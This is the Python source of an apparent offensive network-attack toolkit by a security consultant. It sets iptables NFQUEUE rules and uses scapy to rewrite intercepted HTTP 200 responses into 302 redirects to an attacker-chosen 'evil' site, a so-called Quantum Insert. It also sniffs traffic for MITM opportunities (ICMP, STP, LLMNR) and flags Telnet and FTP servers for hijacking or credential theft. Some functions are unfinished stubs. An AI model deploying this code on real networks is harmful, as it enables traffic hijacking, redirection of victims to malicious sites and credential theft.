#
#======================================================================
# 
#    88888888
#   88      888                                         88    88
#  888       88                                         88
#  788           Z88      88  88.888888     8888888   888888  88    8888888.
#   888888.       88     88   888    Z88   88     88    88    88   88     88
#       8888888    88    88   88      88  88       88   88    88   888
#            888   88   88    88      88  88888888888   88    88     888888
#  88         88    88  8.    88      88  88            88    88          888
#  888       ,88     8I88     88      88   88      88   88    88  .88     .88
#   ?8888888888.     888      88      88    88888888    8888  88   =88888888
#       888.          88
#                    88    www.synetis.com
#                 8888  Consulting firm in management and information security
# 
# Fabien DROMAS - Security Consultant @ Synetis | 0xbadcoded
#
#--
#SYNETIS | 0xbadcoded
#CONTACT: www.synetis.com | ww.0xbadcoded.com
#======================================================================
#
#!/usr/bin/env python
#
# Author: St0rn (fabien.dromas@synetis.com)
# Organisation: Synetis
# Description:
#

from os import system
from sys import exit
from scapy.all import *
import nfqueue
import socket

# Global variables
evil=str()

# Set scapy verbose to 0
conf.verbose=0

################## Utils function ##################

# Get Computer IP Adress

def getIp():
        return socket.gethostbyname(socket.gethostname())

# Get Computer active device
def getDevice():
        return conf.iface

# Mac address to Code to determine Hardware constructor

def mac_to_code(addr_mac):
        tmp=addr_mac.split(":")
        code=tmp[0]+tmp[1]+tmp[2]
        return code

# Get SSH Login password with ptrace for SSHRedirect function

def getSSHLoginPassword():
        print "To Do"



################## Scapy function ##################

# Scapy route functions
# Evol:
#   - Discover new route automatically
#   - Test new route automatically
#   - Add new route automatically

def show_route():
        print conf.route

def add_net_route(addr, gateway):
        conf.route.add(net=addr, gw=gateway)

def add_host_route(addr, gateway):
        conf.route.add(host=addr, gw=gateway)

def del_net_route(addr, gateway):
        conf.route.delt(net=addr, gw=gateway)

def del_host_route(addr, gateway):
        conf.route.delt(host=addr, gw=gateway)
        
def resync_route():
        conf.route.resync()


################## Bridge attack Func ##################

# Set iptable rule to use nfqueue

def set_table(chain, proto):
        table="/sbin/iptables -I "+chain+" -p "+proto+" -j NFQUEUE"
        system(table)

# Bridge function to modify network flow

def bridge(func, chain, proto):
        set_table(chain, proto)
        queue=nfqueue.queue()
        queue.open()
        queue.bind(socket.AF_INET)
        queue.set_callback(func)
        queue.create_queue(0)
        queue.set_queue_maxlen(50000)
        queue.set_mode(nfqueue.NFQNL_COPY_PACKET)
        try:
                print "[*] Attack in progress [*]\n"
                queue.try_run()
        except KeyboardInterrupt:
                system("/sbin/iptables -F")
                queue.unbind(socket.AF_INET)
                queue.close()
                pass

def exit():
 exit(0)

#+++++++++++++++++ Define Bridge Func +++++++++++++++++#

# Define Quantum Insert attack Redirect version

def QuantumInsert_redirect(i, pkt):
    global evil
    payload="HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" %evil
    p=IP(pkt.get_data())
    if p[TCP].sport==80 and p.haslayer(Raw):
        if "200 OK" in p[TCP].load:
                print "\n[+] Quantum Insert Redirect target %s to %s" %(p[IP].dst, evil)
                p[TCP].load=payload
                del p[IP].chksum
                del p[TCP].chksum
                pkt.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
    else:
                pkt.set_verdict(nfqueue.NF_ACCEPT)
                
                
# Define SSH Redirection

def SSHRedirect(i, pkt):
        print "SSHRedirect"

#+++++++++++++++ End define Bridge Func +++++++++++++++#


################### Network auto-pwn ###################

# Implement function to determine which mitm method can be execute
# Usage: Run with scapy sniff function => sniff(prn=look_for_mitm_passive)

def look_for_mitm_passive(p):
        proto=list()
        # Find ICMP flow
        if p.haslayer("ICMP") and "ICMP" not in proto:
                print "ICMP is used in this network! Try to use ICMP Redirect"
                proto.append("ICMP")
                # Find Spanning tree flow
        if p.haslayer("STP") and "STP" not in proto:
                print "Spanning Tree Protocol is present! Try to STP Mangling"
                proto.append("STP")


# Get hackable network flow informations
# Usage: Run with scapy sniff function => sniff(prn=get_network_informations)
# Evol:
# 1: Add more protocol
# 2: Launch attack for each network flow
#

def get_network_informations(p):
        proto=list()
        ip=list()
        # Find LLMNR flow
        if p.haslayer("LLMNRQuery") and "LLMNRQuery" not in proto:
                print "LLMNR Query is present! Try to use responder"
                proto.append("LLMNRQuery")
        if p.haslayer("LLMNRResponse") and "LLMNRResponse" not in proto:
                print "LLMNR Response is present! Try to use responder"
                proto.append("LLMNRResponse")
        # Find TCP flow
        if p.haslayer("TCP"):
                if p[TCP].dport==23 and p[IP].dst not in ip:
                        print "%s is a Telnet Server! you can hijack this or steal credential"
                        ip.append(p[IP].dst)
                if p[TCP].dport==21 and p[IP].dst not in ip:
                        print "%s is a FTP Server! you can hijack this or steal credential"
                        ip.append(p[IP].dst)


# Run Quantum Insert Attack Redirect version
def Run_QuantumInsert_redirect(evilsite):
        global evil
        evil=evilsite
        bridge(QuantumInsert_redirect, "INPUT", "tcp")

#################### Main Function #####################

if __name__ == "__main__":
        print "Let me talk about that!\n1337 is my favorite number"
